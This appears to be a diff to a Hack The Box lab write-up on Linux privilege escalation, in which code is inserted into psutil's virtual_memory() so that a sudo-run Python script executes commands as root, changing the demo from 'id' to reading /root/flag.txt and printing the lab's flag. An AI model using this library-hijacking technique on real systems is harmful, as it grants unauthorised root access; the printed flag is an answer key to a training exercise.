@@ -134,7 +134,7 @@ htb-student@ubuntu:~$ find /home/htb-student -type f -perm -04000 -ls 2>/dev/nul
 
 The file `mem_status.py` has the SUID bit set. We can also read the contents and execute the script.
 
-Viewing the file, I see it's being called by psutil which is imported. psutil is also calling the `virtual_memory()`
+Viewing the file, I see it's being called by psutil which is imported. psutil is also calling the function `virtual_memory()` 
 ```
 #!/usr/bin/env python3
 import psutil
@@ -186,15 +186,15 @@ htb-student@ubuntu:~$
 The `virtual_memory()` function is found on line 1920. Here you will place the following inside the function:
 ```
 import os
-os.system('id')
+os.system('cat /root/flag.txt')
 ```
 
-Execute and you will see you are able to execute the function as root:
+Execute and you will get the root flagt:
 ```
-sudo /usr/bin/python3 /home/htb-student/mem_status.py 
-uid=0(root) gid=0(root) groups=0(root)
-uid=0(root) gid=0(root) groups=0(root)
-Available memory: 88.76%
+htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
+HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
+HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
+Available memory: 88.78%
 ```
 
 
